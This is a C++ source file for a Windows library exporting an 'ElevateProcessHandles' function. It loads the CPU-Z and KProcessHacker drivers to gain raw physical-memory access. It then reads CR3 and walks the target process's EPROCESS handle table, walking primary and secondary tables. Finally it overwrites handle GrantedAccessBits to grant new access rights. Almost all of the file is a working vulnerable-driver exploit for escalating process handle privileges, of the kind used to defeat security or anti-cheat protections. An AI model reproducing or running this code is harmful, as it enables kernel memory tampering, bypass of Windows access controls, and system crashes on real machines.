
#include "kprocesshacker.h"
#include "cpuzdrvr.h"


#include "exports.h"

#define	_TABLE_PRIMARY_		0
#define	_TABLE_SECONDARY_	1


#define _CANNOT_GET_HANDLE_TO_PHYSICAL_MEMORY_	21
#define _CANNOT_LOAD_DRIVER_KPROCESS_HACKER_	22
#define _CANNOT_LOAD_DRIVER_CPUZ_				23

#define	_CANNOT_READ_CONTROL_REGISTER_3_		24
#define	_CANNOT_READ_PHYSICAL_ADDRESS_			25



void* HandleEntryAddress(HANDLE handle, void* tableCode, void* dirBase, Driver* driver);



LIB_EXPORT int _stdcall ElevateProcessHandles(int targetPid, int handleCount, 
	HANDLE handles[], DWORD newAccessMasks[], ERROR_OCCURED_CALLBACK fnErrorOccured)
{

	DWORD status = _STATUS_OKAY_;


	// Initialize drivers and physical memory
	//---------------------------------------------
	CpuzDrvr cpuz = CpuzDrvr();
	KProcessHacker kph = KProcessHacker();

	cpuz.InitDriver();
	kph.InitDriver();

	if (!kph.InitPhysicalMemory()) status = _CANNOT_GET_HANDLE_TO_PHYSICAL_MEMORY_;


	if (status == _STATUS_OKAY_) {

		// Reading CR3 register gives the directory base of this process
		//-------------------------------------------------------------
		ULONG64 dirBase;
		if (!cpuz.ReadControlRegister(CR_3, &dirBase)) status = _CANNOT_READ_CONTROL_REGISTER_3_;


		if (status == _STATUS_OKAY_) {

			// Get the eprocess structure of target process
			//---------------------------------------------
			void* processEprocess = util::ProcessEprocessVirtualAddress(targetPid);

			processEprocess = util::TranslateVirtualAddress((void*)dirBase, processEprocess, &kph);

			// Get the Object handle table of process
			//---------------------------------------------
			void* objectTableAddr = nullptr;
			if (!kph.ReadPhysicalAddr((void*)((uint64_t)processEprocess + EPROCESS_OBJECT_TABLE_OFFSET),
				&objectTableAddr, sizeof(void*)))
				status = _CANNOT_READ_PHYSICAL_ADDRESS_;
			else
				objectTableAddr = util::TranslateVirtualAddress((void*)dirBase, objectTableAddr, &kph);

			nt::HANDLE_TABLE handleTable;

			if (status == _STATUS_OKAY_) {
				if (!kph.ReadPhysicalAddr(objectTableAddr, &handleTable, sizeof(handleTable)))
					status = _CANNOT_READ_PHYSICAL_ADDRESS_;
				else {

					// Enumerate process handles
					//---------------------------------------------
					for (int i = 0; i < handleCount; i++) {

						nt::HANDLE_TABLE_ENTRY handleTableEntry;

						// Get handle entry
						void* handleEntryAddress = HandleEntryAddress(handles[i], (void*)handleTable.TableCode, (void*)dirBase, &kph);

						if (!kph.ReadPhysicalAddr(handleEntryAddress, &handleTableEntry, sizeof(nt::HANDLE_TABLE_ENTRY))){
							status = _CANNOT_READ_PHYSICAL_ADDRESS_;
							break;
						}

						// elevate handle
						handleTableEntry.GrantedAccessBits = (handleTableEntry.GrantedAccessBits & 0xFE000000) | (newAccessMasks[i] & 0x00FFFFFF);

						// Potential BSOD
						if (!kph.WritePhysicalAddr(handleEntryAddress, &handleTableEntry, sizeof(nt::HANDLE_TABLE_ENTRY))) {
							status = _CANNOT_READ_PHYSICAL_ADDRESS_;
							break;
						}
					
					}
				}// Process hanles traverse
			} // read process handle table
		} // CR3 Register read
	} // Physical memory init


	cpuz.UnLoadDriver();
	kph.UnLoadDriver();

	return status;
}





void* HandleEntryAddress(HANDLE handle, void* tableCode, void* dirBase, Driver* driver)
{

	void*		pagePtrTable = (void*)((uint64_t)tableCode & ~0x3);
	uint32_t	hValue = (uint32_t)handle >> 2;
	uint8_t		tableType = (uint8_t)tableCode & 0x03; 


	if (tableType == _TABLE_PRIMARY_) {
		
		// Table is Primary
		// The Table Code value points to a page(handle table) containing handle entries (array)
		//	  The first entry is NULL
		//--------------------------------------------------------------------------------
		
		void* handleAddr = (uint8_t*)pagePtrTable + (hValue * sizeof(nt::HANDLE_TABLE_ENTRY));

		return util::TranslateVirtualAddress((void*)dirBase, handleAddr, driver);

	} else if (tableType == _TABLE_SECONDARY_) {

		// Table is Secondary
		// The Table Code value points to a PageTable   [tableCode] -> [pageTable] -> [handle table]
		// Each entry in the PageTable is a pointer to a page(handle table) containing handle entries
		//    Each page can hold 256 handle entries [4096/16]
		//	  The first entry in each page is NULL hence 255
		//--------------------------------------------------------------------------------

		
		// Read The page address containig the handle table needed
		//---------------------------------------------------------
		uint64_t pageTableOffset = (hValue / 0x100) * sizeof(void*);
		uint64_t handleTableOffset = (hValue % 0x100) * sizeof(nt::HANDLE_TABLE_ENTRY);
		
		void* handleTableAddr = (uint8_t*)pagePtrTable + pageTableOffset;
		handleTableAddr = util::TranslateVirtualAddress((void*)dirBase, handleTableAddr, driver);
		if (!driver->ReadPhysicalAddr(handleTableAddr, &handleTableAddr, sizeof(void*)))
			return false;		

		return util::TranslateVirtualAddress((void*)dirBase, (uint8_t*)handleTableAddr + handleTableOffset, driver);

	} else {				// Table is tertially
		// table of pointers to tables of pointers of tables of entries
		// Havent encountered anyone here yet so i return nullptrs
		std::cout << "Table tertially: " << std::endl;

		return nullptr;
	}

	return nullptr;
}